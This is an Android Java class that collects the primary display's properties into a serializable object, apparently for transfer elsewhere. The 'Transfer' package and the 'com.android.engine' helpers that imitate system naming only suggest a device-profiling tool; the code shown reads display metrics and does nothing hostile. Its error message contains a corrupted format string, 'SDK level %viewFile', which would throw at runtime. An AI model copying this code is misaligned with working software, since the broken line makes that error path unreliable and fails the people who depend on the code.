package Transfer;

import android.content.Context;
import android.graphics.Point;
import android.graphics.Rect;
import android.hardware.display.DisplayManager;
import android.os.Build.VERSION;
import android.util.DisplayMetrics;
import android.view.Surface;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;

import static android.view.Display.STATE_DOZE;
import static android.view.Display.STATE_DOZE_SUSPEND;
import static android.view.Display.STATE_OFF;
import static android.view.Display.STATE_ON;
import static android.view.Display.STATE_UNKNOWN;

public class Display implements Serializable {

  public long APPVSYNCOFFSETNANOS;
  public int DISPLAYID;
  public boolean ISVALID;
  public String LARGESTSIZE;
  public float METRICS_DENSITY;
  public int METRICS_HEIGHT;
  public float METRICS_SCALEDDENSITY;
  public int METRICS_WIDTH;
  public float METRICS_XDPI;
  public float METRICS_YDPI;
  public String NAME;
  public long PRESENTATIONDEADLINENANOS;
  public float REALMETRICS_DENSITY;
  public int REALMETRICS_HEIGHT;
  public float REALMETRICS_SCALEDDENSITY;
  public int REALMETRICS_WIDTH;
  public float REALMETRICS_XDPI;
  public float REALMETRICS_YDPI;
  public String REALSIZE;
  public String RECTSIZE;
  public float REFRESHRATE;
  public String ROTATION;
  public String SIZE;
  public String SMALLESTSIZE;
  public String STATE;
  public float[] SUPPORTEDREFRESHRATES;

  public Display() {
    try {
      DisplayManager displayManager =
          (DisplayManager) MyService.context.getSystemService(Context.DISPLAY_SERVICE);
      if (VERSION.SDK_INT >= 17) {
        android.view.Display display = displayManager.getDisplay(0);
        NAME = display.getName();

        if (VERSION.SDK_INT >= 21) {
          APPVSYNCOFFSETNANOS = display.getAppVsyncOffsetNanos();
        }

        DISPLAYID = display.getDisplayId();

        Point point = new Point();
        Point point2 = new Point();

        display.getCurrentSizeRange(point, point2);

        SMALLESTSIZE = point.toString();
        LARGESTSIZE = point2.toString();

        DisplayMetrics displayMetrics = new DisplayMetrics();
        display.getMetrics(displayMetrics);
        METRICS_DENSITY = displayMetrics.density;
        METRICS_WIDTH = displayMetrics.widthPixels;
        METRICS_HEIGHT = displayMetrics.heightPixels;
        METRICS_SCALEDDENSITY = displayMetrics.scaledDensity;
        METRICS_XDPI = displayMetrics.xdpi;
        METRICS_YDPI = displayMetrics.ydpi;

        if (VERSION.SDK_INT >= 21) {
          PRESENTATIONDEADLINENANOS = display.getPresentationDeadlineNanos();
        }

        displayMetrics = new DisplayMetrics();
        display.getRealMetrics(displayMetrics);
        REALMETRICS_DENSITY = displayMetrics.density;
        REALMETRICS_WIDTH = displayMetrics.widthPixels;
        REALMETRICS_HEIGHT = displayMetrics.heightPixels;
        REALMETRICS_SCALEDDENSITY = displayMetrics.scaledDensity;
        REALMETRICS_XDPI = displayMetrics.xdpi;
        REALMETRICS_YDPI = displayMetrics.ydpi;

        point = new Point();
        display.getRealSize(point);
        REALSIZE = point.toString();

        Rect rect = new Rect();
        display.getRectSize(rect);
        RECTSIZE = rect.toString();
        REFRESHRATE = display.getRefreshRate();

        if (display.getRotation() == Surface.ROTATION_0) {
          ROTATION = "0";
        } else if (display.getRotation() == Surface.ROTATION_180) {
          ROTATION = "180";
        } else if (display.getRotation() == Surface.ROTATION_270) {
          ROTATION = "270";
        } else if (display.getRotation() == Surface.ROTATION_90) {
          ROTATION = "90";
        }

        point = new Point();
        display.getSize(point);
        SIZE = point.toString();

        if (VERSION.SDK_INT < 20) {
          STATE = "N/A";
        } else if (display.getState() == STATE_DOZE) {
          STATE = "Doze";
        } else if (display.getState() == STATE_DOZE_SUSPEND) {
          STATE = "Doze Suspended";
        } else if (display.getState() == STATE_OFF) {
          STATE = "Off";
        } else if (display.getState() == STATE_ON) {
          STATE = "On";
        } else if (display.getState() == STATE_UNKNOWN) {
          STATE = "Unknown";
        }

        if (VERSION.SDK_INT >= 21) {
          SUPPORTEDREFRESHRATES = display.getSupportedRefreshRates();
        } else {
          SUPPORTEDREFRESHRATES = new float[] { 0.0f };
        }

        ISVALID = display.isValid();
        return;
      }

      throw new Exception(String.format(
          "This feature requires SDK level %viewFile. The device has level %viewFile.",
          new Object[] { 17, VERSION.SDK_INT }));
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
